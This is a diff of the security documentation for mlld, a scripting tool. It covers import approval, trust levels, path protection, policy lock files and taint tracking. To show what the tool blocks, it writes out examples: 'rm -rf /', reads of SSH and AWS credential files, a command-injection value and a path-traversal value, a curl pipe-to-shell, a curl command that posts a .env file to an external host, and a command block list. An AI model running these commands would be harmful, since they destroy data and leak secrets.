@@ -1,415 +1,403 @@
-# Security in Mlld
+# mlld Security Model
 
-Mlld includes comprehensive security features to protect you from malicious code while maintaining the flexibility needed for legitimate automation tasks.
+mlld implements a comprehensive security model that protects users from malicious code while maintaining ease of use. This document explains the security features and how to configure them.
 
-## Overview
+## Core Security Principles
 
-Mlld's security system protects against:
-- 🚫 Malicious command execution
-- 🔒 Unauthorized file access
-- 🤖 LLM-generated attack code
-- 📦 Compromised imports
-- 🔍 Data exfiltration attempts
+### 1. Progressive Trust
+Start restrictive and allow gradual expansion of trust. Every new operation requires approval until you explicitly trust it.
 
-## Import Security
+### 2. Content Addressing
+All imported content is verified by SHA-256 hash, preventing tampering or substitution attacks.
 
-### How Import Approval Works
+### 3. Offline-First
+Security checks work without internet connectivity. All policies are stored locally.
 
-When you import from a URL or registry, mlld shows you what you're importing:
+### 4. Least Privilege
+mlld only requests the minimum permissions needed for each operation.
 
-```meld
-@import { analyzer } from "mlld://registry/tools/code-analyzer"
+## Security Features
+
+### Command Execution Protection
+
+mlld analyzes all commands before execution:
+
+```mlld
+@run [rm -rf /]  # Blocked by default - dangerous pattern detected
+@run [npm test]  # Allowed after approval - common safe command
 ```
 
-You'll see:
-```
-⚠️  Import requires approval:
-   mlld://registry/tools/code-analyzer
+Commands are categorized by risk:
+- **Safe**: Common development commands (npm test, git status)
+- **Moderate**: Commands that modify files (npm install, git commit)
+- **Dangerous**: Commands with destructive potential (rm -rf, sudo)
 
-Fetching content...
-✓ Resolved to: mlld://gist/alice/abc123
+### Import Security
 
-[Preview of first 20 lines]
-@text greeting = "Code Analyzer v1.0"
-@run [npm install -g eslint]
-...
-
-This import contains:
-- 3 variable definitions
-- 2 run commands
-
-Allow this import? [y/N]: 
-```
-
-### Registry Imports
-
-The mlld registry provides human-friendly names for trusted modules:
-
-```meld
-# Instead of remembering gist IDs:
-@import { reviewer } from "mlld://gist/anthropics/f4d3c2b1a9e8"
-
-# Use friendly names:
-@import { reviewer } from "mlld://registry/prompts/code-review"
-```
-
-### Security Advisories
-
-If a module has known security issues, you'll be warned:
+All imports require approval before first use:
 
 ```
-⚠️  Security Advisories Found:
-   Import: mlld://registry/utils/file-scanner
+🔒 Import approval required:
+Source: https://example.com/template.mld
 
-   🟡 HIGH: MLLD-2024-001
-   Type: command-injection
-   Description: Version 1.0 allows command injection via filename
-   Recommendation: Update to version 1.1 or later
+Content preview:
+---
+@text greeting = "Hello world"
+@run [echo "Running commands"]
+---
 
-Import module with security advisories? [y/N]: 
+Approve this import? [y/N]
 ```
 
-### Import Pinning
+Once approved, imports are cached locally by content hash.
 
-Approved imports are "pinned" to specific versions by default:
+### Path Protection
+
+File system access is restricted:
+
+```mlld
+@path file = [/etc/passwd]        # Blocked - system directory
+@path data = [~/.ssh/id_rsa]      # Blocked - sensitive file
+@path config = [./config.json]    # Allowed - project file
+```
+
+### URL Validation
+
+Network requests are controlled:
+
+```mlld
+@import { x } from "https://trusted.com/module.mld"  # HTTPS required
+@import { x } from "http://insecure.com/module.mld"  # Warning shown
+```
+
+## Trust Levels
+
+Control security verification with trust levels:
+
+```mlld
+# Always trust (skip all checks)
+@import { tool } from @company/internal <trust always>
+@run [deploy.sh] <trust always>
+
+# Verify (prompt for approval) - default
+@import { util } from @community/package <trust verify>
+@run [new-script.sh] <trust verify>
+
+# Never trust (always block)
+@import { danger } from @sketchy/module <trust never>
+@run [suspicious-command] <trust never>
+```
+
+## Resolver Security
+
+The resolver system provides additional security through sandboxing:
+
+### Sandbox Without File System Access
+
+By controlling which resolvers are available, you can sandbox mlld completely:
 
 ```json
-// mlld.config.json
+{
+  "registries": [
+    {
+      "prefix": "@data/",
+      "resolver": "http",
+      "config": {
+        "baseUrl": "https://api.company.com/mlld-data"
+      }
+    }
+  ],
+  "security": {
+    "allowNewResolvers": false,
+    "allowedResolvers": ["http"]
+  }
+}
+```
+
+This configuration:
+- Only allows HTTP resolver (no local file access)
+- Prevents adding new resolvers
+- Limits data access to approved APIs
+
+### Enterprise Control
+
+IT departments can set global policies in `~/.mlld/mlld.lock.json`:
+
+```json
 {
   "security": {
-    "imports": {
-      "allowed": [{
-        "url": "mlld://gist/user/abc123",
-        "hash": "sha256:e3b0c44298fc...",
-        "pinnedVersion": true,
-        "allowedAt": "2024-01-25T10:00:00Z"
-      }]
+    "policies": {
+      "commands": {
+        "default": "verify",
+        "blocked": ["rm -rf", "sudo", "curl"],
+        "allowed": ["npm", "git"]
+      },
+      "resolvers": {
+        "allowed": ["local", "github"],
+        "blocked": ["http"],
+        "allowNewResolvers": false
+      },
+      "imports": {
+        "allowedDomains": ["github.com", "company.com"],
+        "blockedDomains": ["sketchy.com"],
+        "requireHTTPS": true
+      }
     }
   }
 }
 ```
 
-## Command Security
+## Lock File Security
 
-### Pre-flight Checks
+The `mlld.lock.json` file serves as the security policy and audit trail:
 
-Before executing commands, mlld analyzes them for risks:
+### Global Lock File (`~/.mlld/mlld.lock.json`)
+- User-wide security policies
+- Cannot be overridden by project files
+- Managed by user or IT department
 
+### Project Lock File (`./mlld.lock.json`)
+- Project-specific approvals
+- Module dependencies and hashes
+- Additional restrictions (cannot loosen global)
+
+### Security Precedence
+
+For security policies, the most restrictive setting wins:
 ```
-Pre-flight Security Check:
-  ✓ echo "Hello"              (safe)
-  ✓ ls -la                    (safe)
-  ⚠️  curl https://api.com     (network access - needs approval)
-  ❌ rm -rf /                  (BLOCKED - destructive command)
-
-Continue? [y/N]: 
-```
-
-### Dangerous Command Detection
-
-Commands are categorized by risk level:
-
-- **Safe** (auto-allowed): `echo`, `ls`, `pwd`, `cat`
-- **Moderate** (shown but allowed): `npm install`, `git status`
-- **High Risk** (requires approval): `curl`, `wget`, `ssh`
-- **Blocked** (never allowed): `rm -rf /`, fork bombs
-
-### LLM Output Protection
-
-The most dangerous security risk is executing LLM-generated commands:
-
-```meld
-# This is BLOCKED by default:
-@text cmd = @run [claude "write a command to clean my system"]
-@run [@cmd]  # ❌ BLOCKED - Cannot execute LLM output
+Global Block > Project Block > Global Allow > Project Allow > Default
 ```
 
-You'll see:
+For performance settings (TTL), the most specific setting wins:
 ```
-🚨 SECURITY BLOCK: Cannot execute LLM-generated content
-   Variable: cmd
-   Content: rm -rf ~/Downloads/*
-   
-   This is blocked for your safety. LLM outputs should never be
-   executed directly as commands.
+Inline Setting > Project Setting > Global Setting > Default
 ```
 
-## File System Protection
+## Taint Tracking
 
-### Protected Paths
+mlld tracks the origin of all data:
 
-Mlld blocks access to sensitive directories:
-
-```meld
-# These are BLOCKED:
-@text ssh_key = [~/.ssh/id_rsa]      # ❌ SSH keys
-@text aws = [~/.aws/credentials]      # ❌ AWS credentials
-@path config = ~/.mlld/security.json  # ❌ Security config
+```mlld
+@import { userData } from "https://api.com/data"  # Tainted: NETWORK
+@text processed = @userData                       # Tainted: inherited
+@run [echo {{processed}}]                        # Warning: tainted data in command
 ```
 
-Protected paths include:
-- `~/.ssh/` - SSH keys and config
-- `~/.aws/` - AWS credentials
-- `~/.gnupg/` - GPG keys
-- `~/.npmrc` - NPM tokens
-- `**/.env*` - Environment files
-- System directories (`/etc/`, `/System/`, `C:\Windows\`)
-
-### Safe File Access
-
-Regular project files work normally:
-
-```meld
-# These work fine:
-@text readme = [./README.md]
-@text config = [./config.json]
-@run [cat package.json]
-```
+Taint levels:
+- `TRUSTED`: Your local files
+- `FILE_SYSTEM`: Other local files
+- `NETWORK`: Data from URLs
+- `USER_INPUT`: Interactive input
+- `LLM_OUTPUT`: AI-generated content
+- `COMMAND_OUTPUT`: Command results
 
 ## Configuration
 
-### Project Configuration
-
-Configure security in `mlld.config.json`:
+### Basic Security Config
 
 ```json
 {
   "security": {
+    "commands": {
+      "analyze": true,
+      "requireApproval": true,
+      "logCommands": true
+    },
     "imports": {
       "requireApproval": true,
-      "pinByDefault": true
-    },
-    "commands": {
-      "preFlightCheck": true,
-      "blockLLMExecution": true
+      "cacheApprovals": true,
+      "verifyHashes": true
     },
     "paths": {
-      "blockSystemPaths": true
+      "restrictToProject": true,
+      "allowSymlinks": false
     }
   }
 }
 ```
 
-### Security Modes
+### Advanced Resolver Security
 
-Run mlld with different security levels:
-
-```bash
-# Default (balanced security)
-mlld script.mld
-
-# Strict mode (maximum security)
-mlld --security=strict script.mld
-
-# Audit mode (dry run)
-mlld --security=audit script.mld
-```
-
-## Security Commands
-
-### Audit Imports
-
-Check all imports for security issues:
-
-```bash
-mlld security audit
-
-Checking 3 imports...
-
-✓ mlld://registry/prompts/reviewer (safe)
-⚠️  mlld://gist/user/tool (1 advisory)
-✓ ./lib/utils.mld (local file)
-
-1 security advisory found. Run 'mlld security show' for details.
-```
-
-### Registry Search
-
-Search the registry safely:
-
-```bash
-mlld registry search "code review"
-
-Found 3 modules:
-1. prompts/code-review (by: anthropics) ⭐ 245
-   AI-powered code review assistant
-   
-2. tools/pr-reviewer (by: mlld-community) ⭐ 89
-   GitHub PR review automation
-   
-3. templates/review-checklist (by: alice) ⭐ 34
-   Standard code review checklist
-```
-
-### Show Security Status
-
-View current security configuration:
-
-```bash
-mlld security show
-
-Security Configuration:
-- Import approval: REQUIRED
-- Command pre-flight: ENABLED
-- LLM execution: BLOCKED
-- Path protection: ENABLED
-
-Trusted Publishers:
-- mlld-lang (official)
-- anthropics (verified)
-
-Recent Security Events:
-- 2024-01-25 10:30: Blocked rm -rf command
-- 2024-01-25 10:15: Approved import from registry
-```
-
-## Best Practices
-
-### 1. Review Before Importing
-
-Always review import content before approving:
-- Check what commands it runs
-- Look for suspicious patterns
-- Verify the publisher
-
-### 2. Use the Registry
-
-Prefer registry imports over direct URLs:
-```meld
-# Good - uses registry
-@import { tool } from "mlld://registry/tools/formatter"
-
-# Less secure - direct gist
-@import { tool } from "https://gist.github.com/user/id"
-```
-
-### 3. Pin Important Imports
-
-For production scripts, pin imports to specific versions:
-```bash
-mlld security pin mlld://registry/tools/critical-tool
-```
-
-### 4. Audit Regularly
-
-Run security audits on your scripts:
-```bash
-mlld security audit *.mld
-```
-
-### 5. Report Suspicious Modules
-
-If you find malicious code, report it:
-```bash
-mlld security report mlld://registry/suspicious/module
-```
-
-## Common Security Warnings
-
-### "Cannot execute LLM-generated content"
-
-**Cause**: Trying to run output from an AI tool as a command.
-
-**Solution**: Review the output manually and create a safe command:
-```meld
-# Instead of:
-@text cmd = @run [llm "generate command"]
-@run [@cmd]  # Blocked
-
-# Do this:
-@text suggestion = @run [llm "generate command"]
-@add @suggestion  # Show to user
-# Then manually write the safe command:
-@run [echo "safe command here"]
-```
-
-### "Access denied to protected path"
-
-**Cause**: Trying to read sensitive files like SSH keys.
-
-**Solution**: Only access files in your project directory:
-```meld
-# Instead of:
-@text key = [~/.ssh/id_rsa]  # Blocked
-
-# Do this:
-@text config = [./config/app.json]  # Allowed
-```
-
-### "Command requires approval"
-
-**Cause**: Running a potentially dangerous command.
-
-**Solution**: Review the command and approve if safe:
-```
-⚠️  Command requires approval:
-   curl https://install.tool.com | sh
-   
-   This command downloads and executes remote code.
-   
-Allow execution? [y/N]: 
-```
-
-## Reporting Security Issues
-
-If you discover a security vulnerability in mlld:
-
-1. **Do NOT** post it publicly
-2. Email security@mlld-lang.org
-3. Include:
-   - Description of the vulnerability
-   - Steps to reproduce
-   - Potential impact
-   - Suggested fix (if any)
-
-We'll respond within 48 hours and work on a fix.
-
-## FAQ
-
-### Can I disable security features?
-
-Some features can be relaxed in development, but core protections (like LLM output execution blocking) cannot be disabled for safety reasons.
-
-### Why can't I access my SSH keys?
-
-SSH keys contain authentication credentials that could compromise your systems if exposed. Store needed keys in your project directory with proper permissions instead.
-
-### How do I trust a publisher?
-
-Publishers can be verified through:
-- GitHub organization verification
-- Community reputation
-- Code signing (coming soon)
-
-### What happens to blocked commands?
-
-Blocked commands are:
-1. Never executed
-2. Logged for audit
-3. Reported in security status
-
-### Can I add custom security rules?
-
-Yes, in your project's `mlld.config.json`:
 ```json
 {
+  "registries": [
+    {
+      "prefix": "@approved/",
+      "resolver": "github",
+      "config": {
+        "owner": "company",
+        "repo": "approved-modules"
+      }
+    }
+  ],
   "security": {
-    "customRules": {
-      "blockedCommands": ["custom-dangerous-cmd"],
-      "blockedPaths": ["./sensitive-data/**"]
+    "resolvers": {
+      "allowNewResolvers": false,
+      "trustedResolvers": {
+        "@approved/": "always",
+        "@public/": "verify"
+      }
     }
   }
 }
+```
+
+## Module Resolution Security
+
+### Public Modules
+When importing from the public registry:
+
+```mlld
+@import { helper } from @alice/utils
+```
+
+Resolution flow:
+1. Check `alice-utils.public.mlld.ai` DNS record
+2. Fetch from GitHub/GitLab/Gist URL
+3. Verify content hash
+4. Cache locally
+
+The `.public.` domain makes it clear these are publicly accessible modules.
+
+### Private Modules
+Configure private resolvers for internal code:
+
+```mlld
+# Configure in lock file
+{
+  "registries": [{
+    "prefix": "@internal/",
+    "resolver": "github",
+    "config": {
+      "owner": "company",
+      "repo": "private-modules",
+      "token": "${GITHUB_TOKEN}"
+    }
+  }]
+}
+
+# Use in scripts
+@import { tool } from @internal/deploy-tools
+```
+
+## Common Scenarios
+
+### Personal Use
+- Default settings work well
+- Approve imports as needed
+- Trust your own modules
+
+### Team Environment
+- Share project lock files
+- Set up team resolver for shared modules
+- Document trust decisions
+
+### Enterprise Deployment
+- IT sets global policies
+- Approved module repositories
+- Audit trail of all operations
+- Resolver restrictions for sandboxing
+
+## Security Best Practices
+
+1. **Review imports carefully** - Check what commands they run
+2. **Use specific trust** - Don't blindly trust always
+3. **Lock dependencies** - Commit lock files to version control
+4. **Limit resolver access** - Only add resolvers you need
+5. **Regular updates** - Keep mlld and modules updated
+6. **Audit regularly** - Review security logs and approvals
+
+## Preventing Common Attacks
+
+### Command Injection
+```mlld
+# Dangerous - user input in command
+@text userInput = "file.txt; rm -rf /"
+@run [cat {{userInput}}]  # Blocked - injection detected
+
+# Safe - validated input
+@text filename = "file.txt"
+@if @filename matches /^[\w.-]+$/
+  @run [cat {{filename}}]
+@end
+```
+
+### Path Traversal
+```mlld
+# Dangerous - user controls path
+@text userPath = "../../../etc/passwd"
+@path file = [{{userPath}}]  # Blocked - traversal detected
+
+# Safe - restricted to project
+@text name = "config"
+@path file = [./data/{{name}}.json]
+```
+
+### Data Exfiltration
+```mlld
+# Suspicious - sending local data externally
+@text secrets = [./.env]
+@run [curl -X POST https://external.com -d {{secrets}}]  # Warning shown
+```
+
+## Troubleshooting
+
+### "Operation blocked by security policy"
+Check global and project policies. Use `--verbose` to see which policy blocked it.
+
+### "Import not approved"
+The import needs approval. Run interactively or add to lock file.
+
+### "Cannot add resolver"
+Global policy may prevent new resolvers. Check with IT or system admin.
+
+### "Command requires approval"
+The command was flagged as risky. Review and approve if safe.
+
+## Security CLI Commands
+
+### Check Security Status
+```bash
+mlld security status
+
+Security Configuration:
+✓ Command analysis: ENABLED
+✓ Import verification: ENABLED  
+✓ Path protection: ENABLED
+✓ Taint tracking: ENABLED
+
+Resolvers:
+  @notes/ → local (~/Documents/Notes)
+  @work/ → github (company/modules)
+  @alice/ → public registry
+
+Recent blocks:
+  2024-01-25 10:30 - Blocked: rm -rf /
+  2024-01-25 09:15 - Blocked: /etc/passwd access
+```
+
+### Test Security
+```bash
+mlld security test script.mld
+
+Security Analysis:
+- 3 imports (2 approved, 1 new)
+- 5 commands (4 safe, 1 moderate)
+- 2 file accesses (all safe)
+- No suspicious patterns detected
+
+Run with --dry-run to test without execution
 ```
 
 ## Summary
 
-Mlld's security features protect you from common attack vectors while maintaining usability. The system is designed to:
+mlld's security model provides defense in depth:
 
-- ✅ Block obvious attacks automatically
-- ⚠️ Warn about risky operations
-- 👤 Let you make informed decisions
-- 📝 Maintain audit trails
-- 🔒 Protect sensitive data
+1. **Command Analysis** - Blocks dangerous commands
+2. **Import Verification** - Content addressing prevents tampering
+3. **Path Protection** - Restricts file system access
+4. **Resolver Control** - Sandbox via limited data sources
+5. **Trust Levels** - Explicit control over verification
+6. **Policy Hierarchy** - Enterprise control with local flexibility
 
-Security is enabled by default and cannot be fully disabled, ensuring that mlld scripts remain safe to run even when shared with others.
+Security is progressive - start safe, build trust gradually, maintain control.
